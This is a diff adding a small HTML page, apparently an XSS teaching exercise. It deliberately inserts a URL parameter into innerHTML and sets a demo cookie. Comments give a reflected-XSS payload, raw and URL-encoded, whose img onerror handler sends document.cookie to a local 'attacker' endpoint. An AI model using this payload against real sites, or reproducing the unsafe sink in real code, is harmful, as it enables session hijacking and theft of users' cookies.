@@ -1,0 +1,28 @@
+<html>
+    <body>
+        <div>
+            <!-- Vulnerable code -->
+            Welcome, <span id="username"></span>
+        </div>
+        <script>
+            function setCookie(name, value, days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days*24*60*60) );
+                const expires = "expires="+date.toUTCString();
+                document.cookie = name + "=" + value + ";" + expires; 
+                console.log(document.cookie)
+            }
+            setCookie("exampleCookie", "Hello cookie", 4);
+
+            const params = new URLSearchParams(window.location.search)
+            const name = params.get('name')
+            document.getElementById('username').innerHTML = name;
+        </script>
+    </body>
+</html>
+
+<!--encodeURIComponent("<img src=\"does-not-exists\" onerror=\"var img = document.createElement(\'img\'); img.src=`http://127.0.0.1:5000/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">")-->
+
+<!-- http://127.0.0.1:5500/security/xss/ex2.html?name=%3Cimg%20src%3D%22does-not-exists%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%3D%60http%3A%2F%2F127.0.0.1%3A5000%2Fcookie%3Fdata%3D%24%7Bdocument.cookie%7D%60%3Bdocument.querySelector(%27body%27).appendChild(img)%3B%22%3E -->
+
+<!--onerror of img tag we are calling attackers endpoint and attaching cookie(security info) so your application is in trouble-->
